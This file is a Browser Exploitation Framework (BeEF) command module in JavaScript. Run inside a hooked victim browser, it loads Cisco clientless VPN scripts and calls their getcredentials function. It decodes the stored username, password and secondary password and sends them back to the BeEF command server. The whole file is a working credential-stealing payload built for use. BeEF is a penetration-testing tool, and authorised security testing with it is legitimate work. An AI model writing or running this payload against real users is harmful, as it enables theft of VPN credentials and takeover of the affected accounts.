//
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var s = document.createElement("script");
  s.src = "/+CSCOE+/common.js"
  document.body.appendChild(s);
  s = document.createElement("script");
  s.src = "/+CSCOE+/appstart.js";
  document.body.appendChild(s);

  if (typeof getcredentials === "function") {
    setTimeout(function () {
      let creds = getcredentials();
      var result = [];
      result.push({
        "username": rot13(hex_2_ascii(creds.split('/')[0].split('=')[1])),
        "password": rot13(hex_2_ascii(creds.split('/')[1].split('=')[1])),
        "secondary_password": rot13(hex_2_ascii(creds.split('/')[5].split('=')[1]))
      });
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + JSON.stringify(result));
    }, 3000);
  } else {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "failed, most likely due to no auth");
  }
});
